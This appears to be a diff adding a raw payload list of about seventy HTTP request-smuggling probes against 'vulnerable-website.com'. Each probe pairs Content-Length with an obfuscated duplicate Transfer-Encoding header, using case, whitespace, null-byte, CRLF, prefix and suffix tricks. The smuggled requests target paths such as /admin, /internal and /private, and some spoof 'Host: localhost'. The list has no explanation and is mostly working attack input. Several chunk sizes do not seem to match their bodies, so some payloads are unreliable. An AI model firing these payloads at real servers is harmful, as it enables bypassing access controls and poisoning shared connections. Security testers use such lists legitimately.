@@ -1,0 +1,896 @@
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+44
+GET /404 HTTP/1.1
+X-Test-Header: smuggled
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+3c
+GET /test404 HTTP/1.1
+Host: vulnerable-website.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+ Transfer-Encoding: chunked
+
+2e
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5a
+GET /probe HTTP/1.1
+Host: vulnerable-website.com
+X-Detection: test
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+
+28
+GET /detect HTTP/1.1
+Foo: bar
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+46
+GET /detection HTTP/1.1
+X-Smuggle-Test: probe
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+
+52
+POST /detect HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding:[tab]chunked
+
+38
+GET /probe404 HTTP/1.1
+X-Test: value
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+3e
+GET /admin HTTP/1.1
+X-Access: smuggled
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding:chunked
+
+42
+GET /private HTTP/1.1
+Host: vulnerable-website.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: identity, chunked
+
+4c
+GET /internal HTTP/1.1
+Host: vulnerable-website.com
+X-Internal: 1
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, identity
+
+50
+GET /restricted HTTP/1.1
+Host: vulnerable-website.com
+X-Restricted: true
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x-chunked
+
+3a
+GET /smuggle HTTP/1.1
+X-Smuggled: payload
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: trailers
+
+44
+GET /admin HTTP/1.1
+Host: localhost
+X-Admin: true
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding:	chunked
+
+3c
+GET /test HTTP/1.1
+Host: vulnerable-website.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
+
+40
+GET /bypass HTTP/1.1
+X-Bypass-WAF: true
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked; x=y
+
+48
+GET /endpoint HTTP/1.1
+Host: vulnerable-website.com
+X-Test: 1
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+TRANSFER-ENCODING: chunked
+
+36
+GET /path HTTP/1.1
+X-Custom: header
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+transfer-encoding: chunked
+
+3e
+GET /resource HTTP/1.1
+X-Resource: access
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunkedx
+
+42
+GET /api HTTP/1.1
+Host: vulnerable-website.com
+X-API: 1
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: anything
+
+3a
+GET /test123 HTTP/1.1
+X-Test: smuggle
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: chunked
+
+46
+GET /multi HTTP/1.1
+Host: vulnerable-website.com
+X-Multi: true
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: gzip
+
+40
+GET /compress HTTP/1.1
+X-Compressed: false
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: deflate
+
+3c
+GET /deflate HTTP/1.1
+X-Encoding: test
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: compress
+
+3e
+GET /legacy HTTP/1.1
+X-Legacy: encoding
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding:
+
+32
+GET /empty HTTP/1.1
+X-Empty: value
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chu nked
+
+38
+GET /space HTTP/1.1
+X-Space: inline
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: "chunked"
+
+3a
+GET /quoted HTTP/1.1
+X-Quoted: header
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked\x0d\x0a
+
+44
+GET /hex HTTP/1.1
+Host: vulnerable-website.com
+X-Hex: escape
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked\r\n
+
+46
+GET /crlf HTTP/1.1
+Host: vulnerable-website.com
+X-CRLF: injection
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: ,,chunked
+
+3c
+GET /comma HTTP/1.1
+X-Comma: prefix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked,,
+
+3c
+GET /comma2 HTTP/1.1
+X-Comma: suffix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: foo, chunked
+
+40
+GET /multi2 HTTP/1.1
+X-Multiple: encoding
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, bar
+
+42
+GET /multi3 HTTP/1.1
+X-Multiple: encoding2
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+X-Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+50
+GET /confusion HTTP/1.1
+Host: vulnerable-website.com
+X-Confuse: headers
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chUnKed
+
+3a
+GET /case HTTP/1.1
+X-Case: mixed
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: CHUNKED
+
+3a
+GET /upper HTTP/1.1
+X-Upper: case
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: ChUnKeD
+
+3c
+GET /random HTTP/1.1
+X-Random: case
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked\x00
+
+3e
+GET /null HTTP/1.1
+X-Null: byte
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: \x0bchunked
+
+40
+GET /vtab HTTP/1.1
+X-Vertical: tab
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding:  chunked
+
+3c
+GET /space2 HTTP/1.1
+X-Leading: space
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+3e
+GET /trailing HTTP/1.1
+X-Trailing: tab
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunk ed
+
+3a
+GET /middle HTTP/1.1
+X-Middle: space
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: c h u n k e d
+
+40
+GET /spaced HTTP/1.1
+X-Fully: spaced
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked; extension
+
+4a
+GET /extension HTTP/1.1
+Host: vulnerable-website.com
+X-Ext: param
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked; foo=bar
+
+4c
+GET /params HTTP/1.1
+Host: vulnerable-website.com
+X-Param: test
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked; q=1.0
+
+46
+GET /quality HTTP/1.1
+Host: vulnerable-website.com
+X-Q: value
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x, y, z, chunked
+
+48
+GET /chain HTTP/1.1
+Host: vulnerable-website.com
+X-Chain: long
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+TE: chunked
+
+34
+GET /te HTTP/1.1
+X-TE: header
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: trailers, chunked
+
+4a
+GET /trailers HTTP/1.1
+Host: vulnerable-website.com
+X-Trail: test
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked trailers
+
+4c
+GET /chunked-trail HTTP/1.1
+Host: vulnerable-website.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: x
+
+3e
+GET /triple HTTP/1.1
+X-Triple: header
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding: y
+
+3c
+GET /double HTTP/1.1
+X-Double: test
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding: y
+Transfer-Encoding: z
+
+40
+GET /quad HTTP/1.1
+X-Quad: headers
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+46
+GET /duplicate HTTP/1.1
+Host: vulnerable-website.com
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunkedx
+
+40
+GET /wrapped HTTP/1.1
+X-Wrapped: value
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: ychunked
+
+3e
+GET /prefix HTTP/1.1
+X-Prefix: char
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunkedy
+
+3e
+GET /suffix HTTP/1.1
+X-Suffix: char
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: 0chunked
+
+3c
+GET /digit HTTP/1.1
+X-Digit: prefix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked0
+
+3c
+GET /digit2 HTTP/1.1
+X-Digit: suffix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: _chunked
+
+3c
+GET /under HTTP/1.1
+X-Under: score
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked_
+
+3e
+GET /under2 HTTP/1.1
+X-Under: score2
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: -chunked
+
+3a
+GET /dash HTTP/1.1
+X-Dash: prefix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked-
+
+3a
+GET /dash2 HTTP/1.1
+X-Dash: suffix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: .chunked
+
+38
+GET /dot HTTP/1.1
+X-Dot: prefix
+
+0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked.
+
+38
+GET /dot2 HTTP/1.1
+X-Dot: suffix
+
+0
